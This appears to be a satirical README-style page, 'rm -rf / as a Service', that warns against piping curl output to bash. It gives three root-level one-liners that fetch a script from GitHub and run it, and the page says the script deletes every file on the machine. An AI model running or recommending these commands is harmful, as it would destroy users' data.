Welcome to rm -rf / as a Service

Do you need to quickly delete all the files on your machine?

Why not use our rm -rf / as a Service?

It's easy

Just login as root and run

  • On OS-X
curl https://raw.githubusercontent.com/stephenc/raas/os-x/service | bash
  • On modern Linux distributions
curl https://raw.githubusercontent.com/stephenc/raas/linux/service | bash
  • For all other Unix-like systems
curl https://raw.githubusercontent.com/stephenc/raas/master/service | bash
  • Windows support (coming soon)

Disclaimer

This service is provided to help educate all the people who blindly pipe curl output to bash without checking to see what the script will do. If you end up with all the files deleted from your computer then you have just been given an opportunity to learn a life lesson from this experience.
